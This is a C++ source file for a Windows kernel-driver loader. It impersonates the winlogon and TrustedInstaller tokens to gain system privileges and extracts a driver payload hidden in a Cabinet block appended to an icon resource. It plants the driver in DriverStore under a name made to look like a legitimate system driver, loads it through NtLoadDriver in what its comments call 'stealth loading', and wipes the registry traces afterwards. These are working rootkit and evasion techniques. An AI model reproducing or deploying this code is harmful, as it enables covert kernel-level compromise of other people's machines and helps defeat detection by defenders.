// DriverController.cpp
// Kernel driver management for netadapter.sys
// © WESMAR Marek Wesołowski
//
// Handles the full driver lifecycle:
//   1. Privilege escalation (SeLoadDriver, SeDebug, TrustedInstaller impersonation).
//   2. Extracting the driver binary from a Cabinet archive embedded in the app's
//      icon file (kvc.ico contains a trailing MSCF block with the .sys payload).
//   3. Dropping the .sys to its DriverStore path under TrustedInstaller context.
//   4. Writing the minimal SCM registry key and calling NtLoadDriver/NtUnloadDriver
//      directly (bypasses the SCM service creation flow).
//   5. Cleanup: stop, unregister, and scrub registry entries.

#include "DriverController.h"
#include "Resource.h"
#include <winsvc.h>
#include <winternl.h>
#include <iostream>
#include <tlhelp32.h>
#include <fdi.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <algorithm>
#include <stdio.h>

#pragma comment(lib, "cabinet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

namespace fs = std::filesystem;

// ============================================================================
// NTDLL DEFINITIONS FOR STEALTH LOADING
// ============================================================================
// These functions are not in the Windows SDK headers; declare them manually.
// RtlAdjustPrivilege avoids the token-dance of LookupPrivilegeValue +
// AdjustTokenPrivileges — a single call enables a privilege by its LUID number.
// NtLoadDriver / NtUnloadDriver bypass SCM entirely, which avoids creating a
// visible service entry during driver load.
extern "C" {
    NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN ClientWow64, PBOOLEAN WasEnabled);
    NTSTATUS NTAPI NtLoadDriver(PUNICODE_STRING DriverServiceName);
    NTSTATUS NTAPI NtUnloadDriver(PUNICODE_STRING DriverServiceName);
}

// Static device handle — kept open between GetDriverHandle() calls and
// released by CloseDriverHandle().
HANDLE DriverController::hDriver = INVALID_HANDLE_VALUE;

// In-memory buffer holding the Cabinet read context during FDI extraction.
// FDI callbacks receive a raw pointer (cast through g_extractedData.data()),
// so the vector must outlive the FDICopy call.
static std::vector<BYTE> g_extractedData;

// ============================================================================
// FDI CALLBACKS
// ============================================================================
// The Cabinet API (FDI) is callback-driven. We redirect all I/O to an
// in-memory buffer that holds the MemoryReadContext struct, and funnel writes
// straight to a pre-opened Win32 file handle.

// Describes the in-memory Cabinet stream: pointer to raw bytes, total size,
// and current read offset.
struct MemoryReadContext {
    const BYTE* data;
    size_t size;
    size_t offset;
};

// Target path for the extracted driver file.
static std::wstring g_extractionPath;
// Win32 handle to the output file, opened in fdi_notify and closed by FDI
// via fdi_close after the last byte is written.
static HANDLE g_hExtractedFile = INVALID_HANDLE_VALUE;

// --- FDI memory management: thin wrappers around CRT heap ---
static void* DIAMONDAPI fdi_alloc(ULONG cb) { return malloc(cb); }
static void  DIAMONDAPI fdi_free(void* pv)  { free(pv); }

// fdi_open: FDI calls this when it wants to "open" the source archive.
// We return a sentinel value (1234) because the real data comes from the
// in-memory buffer in fdi_read/fdi_seek, not from a real file descriptor.
static INT_PTR DIAMONDAPI fdi_open(char* pszFile, int oflag, int pmode) { return 1234; }

// fdi_close: sentinels 1234 (source) and 1337 are virtual handles;
// anything else is a real Win32 HANDLE from CreateFileW and must be closed.
static int DIAMONDAPI fdi_close(INT_PTR hf) {
    if (hf != 1234 && hf != 1337 && hf != -1) {
        CloseHandle((HANDLE)hf);
    }
    return 0;
}

// fdi_read: serves Cabinet data from the in-memory MemoryReadContext.
// g_extractedData.data() is reinterpreted as a MemoryReadContext* — the
// vector was pre-loaded with a bitwise copy of the struct in RegisterDriver.
static UINT DIAMONDAPI fdi_read(INT_PTR hf, void* pv, UINT cb) {
    MemoryReadContext* ctx = (MemoryReadContext*)g_extractedData.data();
    if (!ctx) return 0;
    size_t remaining = ctx->size - ctx->offset;
    size_t to_read   = (cb < remaining) ? cb : remaining;
    if (to_read > 0) {
        memcpy(pv, ctx->data + ctx->offset, to_read);
        ctx->offset += to_read;
    }
    return static_cast<UINT>(to_read);
}

// fdi_write: routes output bytes to the pre-opened output file handle.
// Sentinel handles (source / invalid) are silently ignored.
static UINT DIAMONDAPI fdi_write(INT_PTR hf, void* pv, UINT cb) {
    if (hf != 1234 && hf != 1337 && hf != -1) {
        DWORD written = 0;
        WriteFile((HANDLE)hf, pv, cb, &written, NULL);
        return written;
    }
    return 0;
}

// fdi_seek: advances the read offset within the in-memory Cabinet stream.
static LONG DIAMONDAPI fdi_seek(INT_PTR hf, LONG dist, int seektype) {
    MemoryReadContext* ctx = (MemoryReadContext*)g_extractedData.data();
    if (!ctx) return -1;
    switch (seektype) {
        case SEEK_SET: ctx->offset  = dist;              break;
        case SEEK_CUR: ctx->offset += dist;              break;
        case SEEK_END: ctx->offset  = ctx->size + dist;  break;
    }
    return static_cast<LONG>(ctx->offset);
}

// fdi_notify: called by FDI for each file in the Cabinet.
// fdintCOPY_FILE  → open the output file and return its handle to FDI.
// fdintCLOSE_FILE_INFO → FDI is done writing; close the handle.
// All other notifications return 0 (continue / use defaults).
static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION pfdin) {
    if (fdint == fdintCOPY_FILE) {
        // Always extract to g_extractionPath regardless of the filename stored
        // in the Cabinet — we only care about the binary blob, not its name.
        g_hExtractedFile = CreateFileW(g_extractionPath.c_str(), GENERIC_WRITE, 0, NULL,
                                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (g_hExtractedFile != INVALID_HANDLE_VALUE) {
            return (INT_PTR)g_hExtractedFile;
        }
        return -1; // Signal extraction failure to FDI.
    }

    if (fdint == fdintCLOSE_FILE_INFO) {
        if (pfdin->hf != -1 && pfdin->hf != 1234 && pfdin->hf != 1337) {
            CloseHandle((HANDLE)pfdin->hf);
            g_hExtractedFile = INVALID_HANDLE_VALUE;
        }
        return TRUE;
    }

    return 0;
}

// ============================================================================
// CORE LOGIC
// ============================================================================

// Enables a named privilege (e.g., SE_DEBUG_NAME, SE_LOAD_DRIVER_NAME) on the
// current process token.  Returns false if the privilege doesn't exist or the
// token doesn't allow adjusting it.
bool DriverController::EnablePrivilege(LPCWSTR privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilege, &luid)) { CloseHandle(hToken); return false; }
    TOKEN_PRIVILEGES tp = { 1, {{luid, SE_PRIVILEGE_ENABLED}} };
    BOOL res = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    return res && GetLastError() == ERROR_SUCCESS;
}

// Elevates the calling thread to TrustedInstaller by:
//   1. Duplicating the winlogon.exe token for SE_IMPERSONATE.
//   2. Starting the TrustedInstaller service if it is stopped.
//   3. Duplicating the TrustedInstaller.exe process token and impersonating it.
//
// TrustedInstaller context is required to write files into the DriverStore
// directory, which is ACL-protected against Admin writes.
// Returns false if any step fails (no token is left on the thread in that case).
bool DriverController::ImpersonateTrustedInstaller() {
    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);

    // Step 1: find winlogon.exe PID (always running on the system session).
    DWORD winlogonPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                    winlogonPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (winlogonPid == 0) return false;

    // Duplicate the winlogon token to gain SE_IMPERSONATE on this thread.
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProcess) return false;
    HANDLE hToken, hDupToken;
    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            ImpersonateLoggedOnUser(hDupToken);
            CloseHandle(hDupToken);
        }
        CloseHandle(hToken);
    }
    CloseHandle(hProcess);

    // Step 2: Ensure TrustedInstaller service is running and get its PID.
    DWORD tiPid = 0;
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, L"TrustedInstaller",
                                      SERVICE_START | SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD needed;
            if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                                     (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                if (ssp.dwCurrentState == SERVICE_STOPPED || ssp.dwCurrentState == SERVICE_STOP_PENDING) {
                    StartServiceW(hSvc, 0, NULL);
                }
            }

            // Wait for the service to reach the running state
            for (int i = 0; i < 5000; ++i) {
                if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING && ssp.dwProcessId != 0) {
                        tiPid = ssp.dwProcessId;
                        break;
                    }
                }
                SwitchToThread();
            }
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    if (tiPid == 0) return false;

    // Impersonate the TrustedInstaller token
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, tiPid);
    if (!hProcess) return false;
    bool success = false;
    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            success = (ImpersonateLoggedOnUser(hDupToken) != 0);
            CloseHandle(hDupToken);
        }
        CloseHandle(hToken);
    }
    CloseHandle(hProcess);
    return success;
}

// Locates the netadapter.inf DriverStore folder by scanning FileRepository for
// a matching wildcard.  The hash suffix in the folder name varies across
// Windows versions, so we can't hardcode the full path.
// Falls back to a known-good default path if no existing folder is found.
std::wstring DriverController::FindDriverStorePath() {
    wchar_t windowsDir[MAX_PATH];
    GetWindowsDirectoryW(windowsDir, MAX_PATH);
    std::wstring driverStoreBase =
        std::wstring(windowsDir) + L"\\System32\\DriverStore\\FileRepository\\";

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((driverStoreBase + L"netadapter.inf_amd64_*").c_str(), &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        std::wstring foundPath = driverStoreBase + findData.cFileName;
        FindClose(hFind);
        return foundPath;
    }

    // Fall back to the hardcoded standard hash so RegisterDriver can still
    // create the directory structure if no prior install exists.
    return driverStoreBase + L"netadapter.inf_amd64_4d8ab2b1a6a69682";
}

// Returns the full path to the driver binary (netadapter.sys).
std::wstring DriverController::GetDriverPath() {
    return FindDriverStorePath() + L"\\netadapter.sys";
}

// Extracts the driver binary embedded in the IDR_DRIVER_PAYLOAD RCDATA resource
// (kvc.ico with a Cabinet appended after the ICO data) and writes it to targetPath.
// Uses FindResource/LoadResource so the payload lives in the .rsrc PE section —
// no post-build appending step needed.
// Returns true on success.
bool DriverController::ExtractDriverFromIcon(const std::wstring& targetPath) {
    // Load the RCDATA resource that contains kvc.ico with the CAB payload.
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_DRIVER_PAYLOAD), RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    DWORD resSize = SizeofResource(NULL, hRes);
    if (resSize == 0) return false;

    const BYTE* pRes = static_cast<const BYTE*>(LockResource(hData));
    if (!pRes) return false;

    // Find the MSCF (Cabinet) signature inside the resource blob.
    // It sits after the ICO header data inside kvc.ico.
    const BYTE cabSig[] = { 'M', 'S', 'C', 'F' };
    const BYTE* pCab = std::search(pRes, pRes + resSize, cabSig, cabSig + 4);
    if (pCab == pRes + resSize) return false;

    if (!ImpersonateTrustedInstaller()) return false;

    // Create the DriverStore directory under TrustedInstaller context —
    // only TI has write rights to FileRepository subdirectories.
    std::error_code ec;
    fs::path parentPath = fs::path(targetPath).parent_path();
    if (!fs::exists(parentPath)) {
        fs::create_directories(parentPath, ec);
    }

    MemoryReadContext mctx = { pCab, resSize - static_cast<size_t>(pCab - pRes), 0 };
    g_extractedData.assign((BYTE*)&mctx, (BYTE*)&mctx + sizeof(mctx));

    g_extractionPath = targetPath;
    ERF erf;
    BOOL res = FALSE;
    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read, fdi_write,
                          fdi_close, fdi_seek, cpuUNKNOWN, &erf);
    if (hfdi) {
        res = FDICopy(hfdi, (char*)"a", (char*)"", 0, fdi_notify, NULL, NULL);
        FDIDestroy(hfdi);
    }

    RevertToSelf();
    return res != FALSE;
}

// Performs the full driver registration sequence.
bool DriverController::RegisterDriver(const std::wstring& driverPathIn) {
    std::wstring driverPath = driverPathIn.empty() ? GetDriverPath() : driverPathIn;
    if (driverPath.empty()) return false;

    // Only extract if the payload is not already in place.
    // On systems where the DriverStore directory does not exist (clean VMs,
    // minimal installs) ImpersonateTrustedInstaller() may fail; if the .sys
    // was placed there by other means (manual copy, previous run) we can skip
    // extraction and proceed directly to service registration.
    bool sysExists = fs::exists(driverPath);
    if (!sysExists) {
        if (!ExtractDriverFromIcon(driverPath)) {
            return false;
        }
    } else {
        // Best-effort refresh: ignore failure (file in use, TI unavailable, etc.)
        ExtractDriverFromIcon(driverPath);
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    // Try to stop and delete any leftover service just in case.
    SC_HANDLE hOldService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (hOldService) {
        SERVICE_STATUS status;
        ControlService(hOldService, SERVICE_CONTROL_STOP, &status);

        // Wait until the service actually reaches SERVICE_STOPPED before deleting.
        SERVICE_STATUS_PROCESS ssp;
        DWORD needed;
        while (QueryServiceStatusEx(hOldService, SC_STATUS_PROCESS_INFO,
                                    (LPBYTE)&ssp, sizeof(ssp), &needed)) {
            if (ssp.dwCurrentState == SERVICE_STOPPED) break;
            SwitchToThread();
        }

        DeleteService(hOldService);
        CloseServiceHandle(hOldService);
    }

    SC_HANDLE hService = CreateServiceW(
        hSCM,
        SERVICE_NAME,
        SERVICE_NAME, // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            CloseServiceHandle(hSCM);
            return true;
        }
        CloseServiceHandle(hSCM);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

// Returns true if the driver device node is open and responds to our IOCTL.
// Opening the device alone is not enough — another driver could own the same
// device path, so IsOurDriverLoaded does an extra ownership check.
bool DriverController::IsDriverLoaded() {
    HANDLE h = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0,
                           nullptr, OPEN_EXISTING, 0, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        CloseHandle(h);
        return IsOurDriverLoaded();
    }
    return false;
}

// Verifies that the driver currently behind DEVICE_NAME is ours by opening the
// device and sending a probe IOCTL (0x80002000).  A valid handle is sufficient
// evidence — a foreign driver would likely have different access semantics.
// A more robust approach would use a private IOCTL code that only our driver
// handles, but this is good enough for the current threat model.
bool DriverController::IsOurDriverLoaded() {
    HANDLE h = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0,
                           nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD bytesReturned = 0;
    DeviceIoControl(h, 0x80002000, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);

    CloseHandle(h);
    return true; // If we got a valid handle, the device node is ours.
}

// Cross-checks the ImagePath in the service registry key against our expected
// DriverStore path.  Used to detect cases where a third-party driver has
// taken the same service name.
bool DriverController::VerifyDriverOwnership() {
    HKEY hKey;
    std::wstring regPath =
        L"System\\CurrentControlSet\\Services\\" + std::wstring(SERVICE_NAME);

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0,
                      KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    wchar_t imagePath[MAX_PATH];
    DWORD type = REG_EXPAND_SZ;
    DWORD size = sizeof(imagePath);

    bool verified = false;
    if (RegQueryValueExW(hKey, L"ImagePath", nullptr, &type,
                         (LPBYTE)imagePath, &size) == ERROR_SUCCESS) {
        std::wstring expectedPath   = GetDriverPath();
        std::wstring expectedNtPath = L"\\??\\" + expectedPath;
        verified = (_wcsicmp(imagePath, expectedNtPath.c_str()) == 0);
    }

    RegCloseKey(hKey);
    return verified;
}

// Loads the driver via NtLoadDriver using the NT registry path.
// Privilege number 10 is SeLoadDriverPrivilege — using the numeric form
// together with RtlAdjustPrivilege avoids a separate LookupPrivilegeValue call.
// Treats STATUS_IMAGE_ALREADY_LOADED (0xC000010E) as success so this function
// is idempotent.
bool DriverController::StartDriver() {
    EnablePrivilege(SE_LOAD_DRIVER_NAME);
    BOOLEAN wasEnabled;
    RtlAdjustPrivilege(10, TRUE, FALSE, &wasEnabled); // 10 = SeLoadDriverPrivilege

    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"
                           + std::wstring(SERVICE_NAME);
    UNICODE_STRING usStr;
    usStr.Buffer         = (PWSTR)regPath.c_str();
    usStr.Length         = (USHORT)(regPath.length() * sizeof(wchar_t));
    usStr.MaximumLength  = usStr.Length + sizeof(wchar_t);

    NTSTATUS status = NtLoadDriver(&usStr);
    // 0x0 = STATUS_SUCCESS, 0xC000010E = STATUS_IMAGE_ALREADY_LOADED
    return (status == 0x0 || status == 0xC000010E);
}

// Unloads the driver via NtUnloadDriver.  Symmetric to StartDriver.
bool DriverController::StopDriver() {
    EnablePrivilege(SE_LOAD_DRIVER_NAME);
    BOOLEAN wasEnabled;
    RtlAdjustPrivilege(10, TRUE, FALSE, &wasEnabled);

    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"
                           + std::wstring(SERVICE_NAME);
    UNICODE_STRING usStr;
    usStr.Buffer        = (PWSTR)regPath.c_str();
    usStr.Length        = (USHORT)(regPath.length() * sizeof(wchar_t));
    usStr.MaximumLength = usStr.Length + sizeof(wchar_t);

    NTSTATUS status = NtUnloadDriver(&usStr);
    return (status == 0x0);
}

// Stops the driver and removes its registry key.  Does not delete the .sys
// file from the DriverStore (caller's responsibility if needed).
bool DriverController::UnregisterDriver() {
    StopDriver();
    CleanupDriverRegistry();
    return true;
}

// Returns the cached driver handle, opening it first if necessary.
// The caller should not close this handle — call CloseDriverHandle() instead.
HANDLE DriverController::GetDriverHandle() {
    if (hDriver != INVALID_HANDLE_VALUE) return hDriver;
    hDriver = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0,
                          nullptr, OPEN_EXISTING, 0, nullptr);
    return hDriver;
}

// Closes the cached driver handle and resets it to INVALID_HANDLE_VALUE.
void DriverController::CloseDriverHandle() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

// Unloads the driver from the kernel and removes its registry key from
// CurrentControlSet and both ControlSet00x fallback entries.
// Proper teardown sequence: NtUnloadDriver first, then registry wipe.
// Best-effort: individual failures are silently ignored.
void DriverController::CleanupDriverRegistry() {
    // Always stop before deleting — never leave the service marked-for-deletion
    // while the driver is still loaded in the kernel.
    StopDriver();

    std::wstring regPath =
        L"System\\CurrentControlSet\\Services\\" + std::wstring(SERVICE_NAME);
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath.c_str());

    // Sweep alternate control sets that Windows may have mirrored into.
    std::wstring cs1Path = L"ControlSet001\\Services\\" + std::wstring(SERVICE_NAME);
    std::wstring cs2Path = L"ControlSet002\\Services\\" + std::wstring(SERVICE_NAME);
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, cs1Path.c_str());
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, cs2Path.c_str());
}
